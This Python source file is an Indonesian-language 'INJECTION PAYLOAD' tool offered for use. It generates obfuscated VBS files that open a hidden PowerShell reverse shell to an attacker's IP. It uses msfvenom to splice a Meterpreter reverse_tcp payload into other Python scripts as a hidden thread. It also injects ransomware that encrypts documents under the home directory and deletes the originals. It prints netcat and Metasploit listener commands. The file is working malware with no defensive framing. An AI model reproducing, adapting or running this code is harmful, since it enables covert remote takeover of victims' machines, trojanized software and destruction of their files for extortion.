import os
import random
import string
import subprocess
import re
import base64
import threading

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def banner():
    print("""

                   INJECTION PAYLOAD
              ╚═════════════════════════╝
              ║          V.1.2          ║
              ╔═════════════════════════╗
         ╔════╝ Author:Emperor_Yetiandi ╚════╗
         ║ Support:github.com/KaisarYetiandi ║
         ╚═══════════════════════════════════╝
""")

def random_var(length=8):
    return ''.join(random.choices(string.ascii_letters, k=length))

def validate_ip_or_domain(value):
    ip_pattern = r"^\d{1,3}(\.\d{1,3}){3}$"
    domain_pattern = r"^(?!-)([a-zA-Z0-9-]{1,63}\.)+[a-zA-Z]{2,}$"
    return re.match(ip_pattern, value) or re.match(domain_pattern, value)

def validate_port(port):
    return port.isdigit() and 1 <= int(port) <= 65535

def powershell_reverse_shell(ip, port):
    return (
        f"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});"
        "$stream = $client.GetStream();"
        "$writer = New-Object System.IO.StreamWriter($stream);"
        "$buffer = New-Object System.Byte[] 1024;"
        "$encoding = New-Object System.Text.ASCIIEncoding;"
        "while(($read = $stream.Read($buffer, 0, 1024)) -ne 0){"
        "$command = $encoding.GetString($buffer, 0, $read);"
        "$output = cmd.exe /c $command 2>&1 | Out-String;"
        "$writer.WriteLine($output);"
        "$writer.Flush()"
        "}"
    )

def obfuscate_chr(text):
    return '""' + ''.join([f' & Chr({ord(c)})' for c in text])

def metode_chr(ip, port, filename_vbs):
    payload = powershell_reverse_shell(ip, port)
    pwsh = 'Chr(112)&Chr(111)&Chr(119)&Chr(101)&Chr(114)&Chr(115)&Chr(104)&Chr(101)&Chr(108)&Chr(108)'
    obf_payload = obfuscate_chr(payload)
    vbs = (
        'Set x = CreateObject("WScript.Shell")\n'
        f'x.Run {pwsh} & " -NoP -NonI -W Hidden -Command " & {obf_payload}, 0, False\n'
    )
    with open(filename_vbs, "w", newline="\r\n") as f:
        f.write(vbs)

def metode_b64(ip, port, filename_vbs):
    payload = powershell_reverse_shell(ip, port)
    encoded = base64.b64encode(payload.encode("utf-16le")).decode()
    vbs = (
        'Set shell = CreateObject("Wscript.Shell")\n'
        f'shell.Run "powershell -NoProfile -NonInteractive -WindowStyle Hidden -EncodedCommand {encoded}", 0, False\n'
    )
    with open(filename_vbs, 'w', newline='\r\n') as f:
        f.write(vbs)

def menu_netcat():
    clear()
    banner()
    print("╔══════════════════════════════════════════════════════╗")
    print("║                  REVERSE SHELL VBS                   ║")
    print("║                  (NETCAT LISTENER)                   ║")
    print("╚══════════════════════════════════════════════════════╝")
    print("\n🔹 Masukkan detail listener:")
    ip = input("   IP/Domain target: ").strip()
    port = input("   Port listener: ").strip()
    filename = input("   Nama file output (tanpa .vbs): ").strip()
    print("\n🔹 Pilih metode payload:")
    print("   1. Obfuscation Chr()")
    print("   2. Base64 UTF-16LE")
    mode = input("   Pilihan metode (1/2): ").strip()

    if not validate_ip_or_domain(ip):
        print("\n❌ IP/domain tidak valid!")
        return
    if not validate_port(port):
        print("\n❌ Port harus antara 1-65535!")
        return
    if not filename:
        filename = random_var() + "_nc"

    filename += ".vbs"

    if mode == "1":
        metode_chr(ip, port, filename)
    elif mode == "2":
        metode_b64(ip, port, filename)
    else:
        print("\n❌ Pilihan tidak valid!")
        return

    print(f"\n✅ File .vbs berhasil dibuat: {filename}")
    print(f"   Jalankan listener Netcat: nc -lnvp {port}")
    print("   Payload berjalan secara hidden tanpa jendela CMD")

def inject_msf_payload_safe(py_file, lhost, lport):
    if not os.path.isfile(py_file):
        print(f"❌ File '{py_file}' tidak ditemukan!")
        return
    if not validate_ip_or_domain(lhost):
        print("❌ LHOST tidak valid!")
        return
    if not validate_port(lport):
        print("❌ LPORT harus 1-65535!")
        return
    try:
        print(f"\n🔧 Membuat payload Metasploit untuk {lhost}:{lport}...")
        result = subprocess.run(
            ["msfvenom", "-p", "python/meterpreter/reverse_tcp", f"LHOST={lhost}", f"LPORT={lport}", "-f", "raw"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        if result.returncode != 0:
            print("❌ Gagal membuat payload!")
            print(result.stderr)
            return
        msf_payload = result.stdout.strip().splitlines()
        with open(py_file, "r", encoding="utf-8") as f:
            original = f.read()
        fn_name = random_var()
        payload_func = [f"def {fn_name}():\n"]
        for line in msf_payload:
            payload_func.append(f"    {line}\n")
        payload_func.append(f"\nthreading.Thread(target={fn_name}, daemon=True).start()\n\n")
        final_code = (
            "import threading\n" +
            ''.join(payload_func) +
            original
        )
        output_file = py_file.replace(".py", "_patched.py")
        with open(output_file, "w", encoding="utf-8") as f:
            f.write(final_code)
        print(f"\n✅ Payload berhasil disisipkan ke '{output_file}'")
        print(f"   Jalankan listener Metasploit dengan perintah:")
        print(f"   msfconsole -x \"use exploit/multi/handler; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST {lhost}; set LPORT {lport}; exploit\"")
    except Exception as e:
        print(f"❌ Error: {e}")

def inject_ransomware_payload(py_file):
    if not os.path.isfile(py_file):
        print(f"❌ File '{py_file}' tidak ditemukan!")
        return
    try:
        with open(py_file, 'r', encoding='utf-8') as f:
            original = f.read()
        fn_name = random_var()
        ransomware_code = f'''
import threading
def {fn_name}():
    from Crypto.Cipher import AES, PKCS1_OAEP
    from Crypto.PublicKey import RSA
    from Crypto.Random import get_random_bytes
    from Crypto.Util.Padding import pad
    import os

    public_key = b\"\"\"-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAnFakeExampleKeyHere
-----END PUBLIC KEY-----\"\"\"
    rsa_key = RSA.import_key(public_key)
    cipher_rsa = PKCS1_OAEP.new(rsa_key)

    def encrypt_file(filepath):
        try:
            with open(filepath, 'rb') as f:
                data = f.read()
            aes_key = get_random_bytes(32)
            cipher_aes = AES.new(aes_key, AES.MODE_CBC)
            ciphertext = cipher_aes.encrypt(pad(data, AES.block_size))
            enc_key = cipher_rsa.encrypt(aes_key)
            with open(filepath + '.locked', 'wb') as f:
                f.write(enc_key + cipher_aes.iv + ciphertext)
            os.remove(filepath)
        except: pass

    EXT = ['.txt','.docx','.xls','.pdf','.jpg','.ico','.png','.mp4','.mp3']
    for root, _, files in os.walk(os.path.expanduser("~")):
        for file in files:
            if any(file.endswith(ext) for ext in EXT):
                encrypt_file(os.path.join(root, file))

threading.Thread(target={fn_name}, daemon=True).start()

'''
        output_file = py_file.replace(".py", "_patched.py")
        with open(output_file, "w", encoding='utf-8') as f:
            f.write(ransomware_code + '\n' + original)
        print(f"\n✅ Payload Ransomware berhasil disisipkan ke '{output_file}'")
        print("   PERINGATAN:Gunakan Dengan Bijak:)!")
    except Exception as e:
        print(f"❌ Error: {e}")

def menu_metasploit():
    clear()
    banner()
    print("╔══════════════════════════════════════════════════════╗")
    print("║               INJECT PAYLOAD METASPLOIT              ║")
    print("║                 KE DALAM FILE PYTHON                 ║")
    print("╚══════════════════════════════════════════════════════╝")
    print("\n🔹 Masukkan detail payload:")
    py_file = input("   Nama file Python target: ").strip()
    lhost = input("   LHOST (IP/ngrok): ").strip()
    lport = input("   LPORT: ").strip()
    inject_msf_payload_safe(py_file, lhost, lport)

def menu_ransomware():
    clear()
    banner()
    print("╔══════════════════════════════════════════════════════╗")
    print("║               INJECT PAYLOAD RANSOMWARE              ║")
    print("║                 KE DALAM FILE PYTHON                 ║")
    print("╚══════════════════════════════════════════════════════╝")
    print("\n⚠️ PERINGATAN: File hasil akan mengenkripsi dokumen user!")
    py_file = input("\n   Nama file Python target: ").strip()
    inject_ransomware_payload(py_file)

def main_menu():
    while True:
        clear()
        banner()
        print("╔══════════════════════════════════════════════════════╗")
        print("║                     MENU UTAMA                       ║")
        print("╠══════════════════════════════════════════════════════╣")
        print("║ 1. Buat Reverse Shell VBS (Netcat)                   ║")
        print("║ 2. Sisipkan Payload Metasploit ke Python             ║")
        print("║ 3. Sisipkan Payload Ransomware ke Python             ║")
        print("║ 0. Keluar                                            ║")
        print("╚══════════════════════════════════════════════════════╝")
        choice = input("\nPilih menu (0-3): ").strip()

        if choice == "1":
            menu_netcat()
        elif choice == "2":
            menu_metasploit()
        elif choice == "3":
            menu_ransomware()
        elif choice == "0":
            print("\nKeluar dari program...")
            break
        else:
            print("\n❌ Pilihan tidak valid!")
        input("\n   Tekan Enter untuk kembali ke menu...")

if __name__ == "__main__":
    main_menu()